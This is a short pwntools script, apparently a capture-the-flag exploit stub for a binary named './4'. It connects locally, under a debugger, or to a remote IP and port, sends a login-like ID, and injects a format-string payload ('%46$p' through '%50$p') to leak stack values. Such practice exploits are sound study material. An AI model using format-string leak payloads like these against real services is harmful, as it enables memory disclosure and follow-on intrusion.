from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug('./4', 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process('./4')

def solve(): 
    p = conn()
    
    if(args.REMOTE):
        p.sendline("13523032")
        p.sendline("4")

    # write your payload here
    # payload = b'%44$p %45$p %46$p %47$p %48$p'
    payload = b'%46$p %47$p %48$p %49$p %50$p'
    print(payload)

    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()